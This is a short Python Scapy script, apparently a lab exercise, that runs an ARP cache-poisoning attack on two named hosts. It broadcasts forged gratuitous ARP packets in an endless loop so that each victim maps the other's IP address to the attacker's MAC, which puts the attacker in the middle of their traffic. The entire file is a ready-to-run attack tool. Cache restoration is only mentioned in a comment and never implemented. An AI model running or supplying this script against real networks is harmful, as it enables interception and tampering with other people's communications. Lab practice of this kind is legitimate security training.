#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp
import time

# --- Configuration ---
VICTIM_A_IP = "10.9.0.5"
VICTIM_A_MAC = "02:42:0a:09:00:05" # For context

VICTIM_B_IP = "10.9.0.6"
VICTIM_B_MAC = "02:42:0a:09:00:06" # For context

ATTACKER_MAC = "02:42:0a:09:00:69" # Host M's MAC address
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
INTERFACE = "eth0" 
POISON_INTERVAL = 5 # Seconds

print("[*] Starting Combined ARP Poisoning...")
print(f"[*] Target 1 (Host A - {VICTIM_A_IP}): Will be told {VICTIM_B_IP} is at {ATTACKER_MAC}")
print(f"[*] Target 2 (Host B - {VICTIM_B_IP}): Will be told {VICTIM_A_IP} is at {ATTACKER_MAC}")

# This is almost the same code for "reply.py" but modified so it poisons both hosts. 
try:
    # Packet to poison Host A (telling A that B's IP is at Attacker's MAC)
    ether_A = Ether(src=ATTACKER_MAC, dst=BROADCAST_MAC)
    arp_A = ARP(op=1, # Gratuitous ARP
                hwsrc=ATTACKER_MAC,
                psrc=VICTIM_B_IP,  # Spoofing Host B's IP
                hwdst="00:00:00:00:00:00",
                pdst=VICTIM_B_IP)
    packet_for_A = ether_A / arp_A

    # Packet to poison Host B (telling B that A's IP is at Attacker's MAC)
    ether_B = Ether(src=ATTACKER_MAC, dst=BROADCAST_MAC)
    arp_B = ARP(op=1, # Gratuitous ARP
                hwsrc=ATTACKER_MAC,
                psrc=VICTIM_A_IP,  # Spoofing Host A's IP
                hwdst="00:00:00:00:00:00",
                pdst=VICTIM_A_IP)
    packet_for_B = ether_B / arp_B

    # We need to do this continously so arp tables stay poiting to host M. 
    while True:
        # Send poison packet to Host A
        sendp(packet_for_A, iface=INTERFACE, verbose=False)

        # Send poison packet to Host B
        sendp(packet_for_B, iface=INTERFACE, verbose=False)
        
        time.sleep(POISON_INTERVAL)

except KeyboardInterrupt:
    print("\n[*] Stopping combined ARP poisoning.")
    # Optionally, send corrective ARP packets here to restore caches
except Exception as e:
    print(f"[!] Error in combined script: {e}")